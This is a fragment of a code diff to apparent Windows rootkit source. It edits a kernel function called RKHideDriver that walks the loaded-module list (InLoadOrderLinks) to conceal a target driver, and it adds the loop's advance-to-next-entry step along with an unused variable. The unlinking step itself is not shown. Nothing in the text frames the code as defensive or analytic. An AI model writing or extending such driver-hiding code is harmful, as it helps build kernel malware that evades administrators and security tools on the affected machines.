@@ -338,6 +338,7 @@ NTSTATUS RKHideDriver(
 )
 {
 	PKLDR_DATA_TABLE_ENTRY pDataTabeEntry = NULL, pCurrentTableEntry = NULL;
+	LIST_ENTRY CurrentListEntry;
 	// first let's check whether we have a valid pointer.
 	if (DriverObject == NULL || TargetDriverPath == NULL)
 		return STATUS_INVALID_ADDRESS;
@@ -360,6 +361,12 @@ NTSTATUS RKHideDriver(
 
 			}
 		}
+
+		// NOW THE NEXT
+		pCurrentTableEntry = CONTAINING_RECORD(pCurrentTableEntry->InLoadOrderLinks.Flink,
+												KLDR_DATA_TABLE_ENTRY, 
+												InLoadOrderLinks);
+	
 	}
 
 	return STATUS_SUCCESS;
